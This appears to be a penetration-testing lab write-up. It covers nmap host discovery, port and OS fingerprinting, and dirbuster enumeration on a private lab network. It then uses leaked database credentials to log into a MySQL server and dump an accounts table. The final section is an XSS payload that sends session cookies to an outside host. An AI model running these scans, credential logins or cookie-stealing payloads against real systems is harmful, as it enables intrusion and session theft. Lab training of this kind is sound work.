# Scanning and OS Fingerprinting

## Check IP Address

```
tap0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.142.111.240  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::98b4:5bff:fe5a:8d5b  prefixlen 64  scopeid 0x20<link>
        ether 9a:b4:5b:5a:8d:5b  txqueuelen 1000  (Ethernet)
        RX packets 7  bytes 608 (608.0 B)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 8  bytes 656 (656.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Ping sweep with nmap

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sn -n 10.142.111.*
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 11:35 EST
Nmap scan report for 10.142.111.1
Host is up (0.22s latency).
MAC Address: 00:50:56:87:0A:18 (VMware)
Nmap scan report for 10.142.111.6
Host is up (0.40s latency).
MAC Address: 00:50:56:87:6A:6F (VMware)
Nmap scan report for 10.142.111.48
Host is up (0.23s latency).
MAC Address: 00:50:56:87:0B:6E (VMware)
Nmap scan report for 10.142.111.96
Host is up (0.23s latency).
MAC Address: 00:50:56:87:6A:6F (VMware)
Nmap scan report for 10.142.111.99
Host is up (0.23s latency).
MAC Address: 00:50:56:87:31:6A (VMware)
Nmap scan report for 10.142.111.100
Host is up (0.23s latency).
MAC Address: 00:50:56:87:6A:6F (VMware)
Nmap scan report for 10.142.111.213
Host is up (0.23s latency).
MAC Address: 00:50:56:87:04:F4 (VMware)
Nmap scan report for 10.142.111.240
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 4.89 seconds 
```

## SYN scan with nmap

```
──(root💀kali)-[~/Desktop]
└─# nmap -sS 10.142.111.1,6,48,96,99,100,213                                  130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 11:36 EST
Nmap scan report for 10.142.111.1
Host is up (0.34s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 00:50:56:87:0A:18 (VMware)

Nmap scan report for 10.142.111.6
Host is up (0.42s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:87:6A:6F (VMware)

Nmap scan report for 10.142.111.48
Host is up (0.41s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:87:0B:6E (VMware)

Nmap scan report for 10.142.111.96
Host is up (0.39s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:87:04:F4 (VMware)

Nmap scan report for 10.142.111.99
Host is up (0.32s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 00:50:56:87:31:6A (VMware)

Nmap scan report for 10.142.111.100
Host is up (0.25s latency).
All 1000 scanned ports on 10.142.111.100 are closed
MAC Address: 00:50:56:87:04:F4 (VMware)

Nmap scan report for 10.142.111.213
Host is up (0.40s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
81/tcp open  hosts2-ns
MAC Address: 00:50:56:87:04:F4 (VMware)

Nmap done: 7 IP addresses (7 hosts up) scanned in 101.79 seconds
```

## Version and OS detection scan

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sV -O 10.142.111.1,6,48,96,99,100,213
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 11:40 EST
Nmap scan report for 10.142.111.1
Host is up (0.34s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.4p1 (FreeBSD 20100308; protocol 2.0)
53/tcp open  domain  dnsmasq 2.55
80/tcp open  http    lighttpd 1.4.29
MAC Address: 00:50:56:87:0A:18 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device|broadband router
Running (JUST GUESSING): OpenBSD 4.X|5.X (92%), FreeBSD 7.X|9.X (86%), Apple Apple TV 5.X (85%), Scientific Atlanta embedded (85%)
OS CPE: cpe:/o:openbsd:openbsd:4.3 cpe:/o:freebsd:freebsd:7.0 cpe:/o:openbsd:openbsd:4 cpe:/a:apple:apple_tv:5.2.1 cpe:/a:apple:apple_tv:5.3 cpe:/o:freebsd:freebsd:9.1 cpe:/h:scientificatlanta:webstar_dpc2100
Aggressive OS guesses: OpenBSD 4.3 (92%), FreeBSD 7.0-RELEASE (86%), OpenBSD 4.1 (85%), OpenBSD 4.4 (85%), OpenBSD 4.9 - 5.1 (85%), Apple TV 5.2.1 or 5.3 (85%), FreeBSD 9.1-PRERELEASE (85%), Scientific Atlanta WebSTAR DPC2100 cable modem (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Nmap scan report for 10.142.111.6
Host is up (0.32s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
MAC Address: 00:50:56:87:6A:6F (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/1%OT=22%CT=1%CU=37894%PV=Y%DS=1%DC=D%G=Y%M=005056%T
OS:M=5FC6726C%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M4E7ST11NW2%O2=M4E7ST11NW2%O3=M4E7NNT11NW2%O4=M4E7ST11NW2%O
OS:5=M4E7ST11NW2%O6=M4E7ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6
OS:=3890)ECN(R=Y%DF=Y%T=40%W=3908%O=M4E7NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.142.111.48
Host is up (0.32s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 00:50:56:87:0B:6E (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/1%OT=135%CT=1%CU=31706%PV=Y%DS=1%DC=D%G=Y%M=005056%
OS:TM=5FC6726C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%II=
OS:I%SS=S%TS=0)OPS(O1=M4E7NW0NNT00NNS%O2=M4E7NW0NNT00NNS%O3=M4E7NW0NNT00%O4
OS:=M4E7NW0NNT00NNS%O5=M4E7NW0NNT00NNS%O6=M4E7NNT00NNS)WIN(W1=FFFF%W2=FFFF%
OS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4E7NW0NNS%CC
OS:=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=
OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FFFF%S=O%A=S+%F=AS%O=M4E7NW0NNT00NN
OS:S%RD=0%Q=)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Nmap scan report for 10.142.111.96
Host is up (0.39s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
MAC Address: 00:50:56:87:04:F4 (VMware)
Aggressive OS guesses: Linux 3.2 - 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.2 (95%), Linux 3.2 - 3.10 (95%), XBMCbuntu Frodo v12.2 (Linux 3.X) (95%), Olivetti 65C-9 printer (95%), Linux 3.16 (95%), Linux 2.6.32 - 3.10 (94%), Linux 2.6.32 - 3.9 (94%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

Nmap scan report for 10.142.111.99
Host is up (0.37s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.4p1 (FreeBSD 20100308; protocol 2.0)
53/tcp open  domain  dnsmasq 2.55
80/tcp open  http    lighttpd 1.4.29
MAC Address: 00:50:56:87:31:6A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device|broadband router
Running (JUST GUESSING): OpenBSD 4.X|3.X|5.X (94%), Apple Apple TV 5.X (85%), FreeBSD 9.X (85%), Scientific Atlanta embedded (85%)
OS CPE: cpe:/o:openbsd:openbsd:4.3 cpe:/o:openbsd:openbsd:3 cpe:/o:openbsd:openbsd:4 cpe:/a:apple:apple_tv:5.2.1 cpe:/a:apple:apple_tv:5.3 cpe:/o:freebsd:freebsd:9.1 cpe:/h:scientificatlanta:webstar_dpc2100
Aggressive OS guesses: OpenBSD 4.3 (94%), OpenBSD 3.8 - 4.7 (85%), OpenBSD 4.9 - 5.1 (85%), OpenBSD 5.2 (85%), Apple TV 5.2.1 or 5.3 (85%), FreeBSD 9.1-PRERELEASE (85%), Scientific Atlanta WebSTAR DPC2100 cable modem (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Nmap scan report for 10.142.111.100
Host is up (0.25s latency).
All 1000 scanned ports on 10.142.111.100 are closed
MAC Address: 00:50:56:87:04:F4 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

Nmap scan report for 10.142.111.213
Host is up (0.36s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
81/tcp open  http    Apache httpd 2.2.22 ((Debian))
MAC Address: 00:50:56:87:04:F4 (VMware)
Aggressive OS guesses: Linux 3.2 (95%), Linux 3.2 - 3.10 (95%), Linux 3.2 - 3.16 (95%), Olivetti 65C-9 printer (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), XBMCbuntu Frodo v12.2 (Linux 3.X) (94%), Linux 3.16 (94%), Linux 3.5 (94%), Linux 2.6.32 - 3.10 (93%), Linux 2.6.32 - 3.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 7 IP addresses (7 hosts up) scanned in 127.83 seconds
```

# Dirbuster

## Find all machine in network - nmap ping sweep

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -n -sn 10.104.11.*                    
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 11:49 EST
Nmap scan report for 10.104.11.96
Host is up (0.40s latency).
MAC Address: 00:50:56:87:32:C5 (VMware)
Nmap scan report for 10.104.11.198
Host is up (0.33s latency).
MAC Address: 00:50:56:87:32:C5 (VMware)
Nmap scan report for 10.104.11.50
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 12.70 seconds

Found 2 host:
10.104.11.96
10.104.11.198
```

## Identify Machine Roles

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sS 10.104.11.96,198                  
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 11:51 EST
Nmap scan report for 10.104.11.96
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:50:56:87:32:C5 (VMware)

Nmap scan report for 10.104.11.198
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql
MAC Address: 00:50:56:87:E9:B2 (VMware)

Nmap done: 2 IP addresses (2 hosts up) scanned in 29.11 seconds

10.104.11.96 - web server
10.104.11.198 - DB server
```

## Explore the web application in http://10.104.11.96

```
dirbuster http://10.104.11.96 directory-list-2.3.-small.txt

Enter the target's information and pick up Brute Force lists at /usr/share/dirbuster/wordlists before performing the scan.

┌──(root💀kali)-[~/Desktop]
└─# cat config.old     
<?php
$dbhostname='127.0.0.1';
$dbuser='awd';
$dbpassword='UcuicjsQgG0FILdjdL8D';
$dbname='awd';

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname) or die("Unable to connect to MySQL");

/*
$pages = array (
    'index.php?a=announce.txt' => 'Home',
    'news.php' => 'News',
    'pubs.php' => 'Publications',
    '#' => 'Sing up'
);
*/

$pages = array (
    'index.php' => 'Home',
    'news.php' => 'News',
    'awards.php' => 'Awards',
    'offline.php' => 'Sing up'
);

?>

                                                                                                                                                                                                                                           
┌──(root💀kali)-[~/Desktop]
└─# mysql -u awd -p -h 10.104.11.198
Enter password: 
ERROR 1045 (28000): Access denied for user 'awd'@'10.104.11.50' (using password: YES)


Sign-up

TODO: Sign-up page

@Dev team: the DB credentials are
    Username:   awdmgmt
    Password:   UChxKQk96dVtM07
    Host:       10.104.11.198
    DB:         awdmgmt_accounts
    DMBS:       MySQL

To test the credentials you can use mysql via command line (Windows, Linux, Mac):
    example: mysql -u USERNAME -pPASSWORD -h HOST DB

Best regards
    IT TEAM
```

## Access to DB

```
┌──(root💀kali)-[~/Desktop]
└─# mysql -u awdmgmt -p -h 10.104.11.198                                                                                                                                                                                               1 ⨯
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 128
Server version: 5.5.38-0+wheezy1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| awdmgmt_accounts   |
+--------------------+
2 rows in set (0.227 sec)

MySQL [(none)]> use awdmgmt_accounts;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [awdmgmt_accounts]> show tables;
+----------------------------+
| Tables_in_awdmgmt_accounts |
+----------------------------+
| accounts                   |
+----------------------------+
1 row in set (0.226 sec)

MySQL [awdmgmt_accounts]> select * from accounts;
+----+--------------------+----------+-------------+
| id | email              | password | displayname |
+----+--------------------+----------+-------------+
|  1 | admin@awdmgmt.labs | ENS7VvW8 | Admin       |
+----+--------------------+----------+-------------+
1 row in set (0.226 sec)

MySQL [awdmgmt_accounts]> 
```

# XSS

```
<script>var i = new Image();i.src="http://192.168.99.11/get.php?cookie="+document.cookie;</script>
```
